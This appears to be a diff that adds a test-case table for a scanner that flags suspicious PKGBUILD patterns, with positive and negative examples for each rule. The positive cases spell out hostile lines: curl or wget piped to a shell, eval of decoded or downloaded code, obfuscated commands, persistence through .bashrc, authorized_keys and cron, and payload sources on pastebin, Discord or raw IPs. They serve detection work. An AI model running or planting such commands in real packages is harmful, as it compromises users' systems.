@@ -1,0 +1,88 @@
+# Rule cases for rules.bats (ADR 0143): id  polarity(+|-)  placement  text
+# Placements: build (into build()), install (into post_install), top
+# (PKGBUILD top level), file (extra helper.sh), source / source-skip (an
+# extra source, real / SKIP sum), nosrcinfo (drop .SRCINFO), pkgbase.
+# @BLOB@ expands to a 120-char base64 run.
+named-pkg-install	+	build	npm install atomic-lockfile
+named-pkg-install	+	build	bun add js-digest
+named-pkg-install	+	install	yarn add lockfile-js
+named-pkg-install	-	build	npm install
+named-pkg-install	-	build	npm ci --cache "$srcdir/c"
+named-pip-gem	+	build	pip install requests
+named-pip-gem	+	build	gem install bundler
+named-pip-gem	-	build	pip install --no-deps --root="$pkgdir" dist/*.whl
+named-pip-gem	-	build	pip install -r requirements.txt
+named-pip-gem	-	build	gem install --no-user-install -i "$pkgdir/g" x.gem
+pipe-to-shell	+	build	curl -fsSL https://x.example/i | sh
+pipe-to-shell	+	file	wget -qO- https://x.example/i | python3
+pipe-to-shell	-	build	curl -s https://x.example/a | tar xz
+exec-download	+	build	bash <(curl -s https://x.example/i)
+exec-download	+	file	eval "$(wget -qO- https://x.example/i)"
+exec-download	-	build	bash ./configure.sh
+script-fetch	+	file	python -c "import urllib.request as u;exec(u.urlopen('h'))"
+script-fetch	-	file	python -c "print(1)"
+decode-exec	+	build	echo aGk= | base64 -d | bash
+decode-exec	-	build	base64 -d in > out
+decode-eval	+	file	eval "$(echo aGk= | base64 -d)"
+decode-eval	-	file	eval "$(dircolors)"
+install-network	+	install	curl -s https://x.example/p -o /tmp/p
+install-network	+	install	bun install js-digest
+install-network	-	install	echo "run git pull to update"
+install-network	-	install	ldconfig
+home-persistence	+	build	echo 'x' >> ~/.bashrc
+home-persistence	+	file	cp key "$HOME/.ssh/authorized_keys"
+home-persistence	-	install	echo "add foo to your ~/.zshrc"
+home-persistence	-	build	install -Dm644 f "$pkgdir/etc/skel/.bashrc"
+etc-persistence	+	install	echo '* * * * * x' > /etc/cron.d/x
+etc-persistence	+	install	echo job | crontab -
+etc-persistence	-	build	install -Dm644 x "$pkgdir"/etc/profile.d/x.sh
+etc-persistence	-	build	install -Dm644 x "$pkgdir/etc/cron.d/x"
+bad-source-host	+	source	https://pastebin.com/raw/abc
+bad-source-host	+	source	https://cdn.discordapp.com/attachments/1/x
+bad-source-host	-	source	https://github.com/rulecase/pastebin.com-mirror
+raw-ip-source	+	source	https://130.162.225.47:8080/x
+raw-ip-source	-	source	https://github.com/rulecase/v1.2.3.4.tar.gz
+build-network	+	build	wget https://github.com/rulecase/y
+build-network	+	build	git clone https://github.com/rulecase/r
+build-network	-	build	git -C "$srcdir/r" submodule update
+npx-run	+	build	npx electron-builder
+npx-run	-	build	./node_modules/.bin/electron-builder
+python-inline	+	build	python -c "print(1)"
+python-inline	-	build	python setup.py build
+install-interp	+	install	python /opt/x/patches/main.py
+install-interp	-	install	echo "python 3 required"
+install-systemctl	+	install	systemctl enable --now x.service
+install-systemctl	-	install	systemctl daemon-reload
+unit-write	+	install	cp x.service /etc/systemd/system/
+unit-write	-	build	install -Dm644 x "$pkgdir/usr/lib/systemd/system/x"
+http-source	+	source	http://example.org/a.tar.gz
+http-source	-	source	https://example.org/a.tar.gz
+gist-source	+	source	https://gist.githubusercontent.com/u/1/raw/x
+gist-source	-	source	https://github.com/rulecase/gist
+obfuscated-blob	+	build	_p=@BLOB@
+obfuscated-blob	-	build	_c=0123456789abcdef
+hex-escapes	+	build	printf '\x63\x75\x72\x6c\x20\x2d\x73\x20'
+hex-escapes	-	build	printf '\x63'
+rev-pipe	+	build	echo lrucs | rev | sh
+rev-pipe	-	build	sort | uniq
+decode-pipe	+	build	printf '%b' "\x63" | sh
+decode-pipe	-	build	printf '%b\n' x
+eval-subst	+	build	eval "$(./gen)"
+eval-subst	-	build	eval set -- x
+srcinfo-missing	+	nosrcinfo	-
+srcinfo-missing	-	build	true
+srcinfo-mismatch	+	build	make URL=https://evil.example/x
+srcinfo-mismatch	-	build	make URL=https://github.com/rulecase/y
+skip-checksum	+	source-skip	https://example.org/a.tar.gz
+skip-checksum	-	source-skip	git+https://github.com/rulecase/x.git
+source-owner	+	source-skip	git+https://github.com/attacker/patch.git
+source-owner	-	source-skip	git+https://github.com/rulecase/extra.git
+toplevel-code	+	top	touch /tmp/x
+toplevel-code	+	top	_v=$(uname)
+toplevel-code	-	top	_commit=abc123
+bin-package	+	pkgbase	rulecase-bin
+bin-package	-	pkgbase	rulecase
+lockfile-install	+	build	npm ci
+lockfile-install	-	build	npm run build
+lang-fetch	+	build	cargo fetch --locked
+lang-fetch	-	build	cargo build --frozen
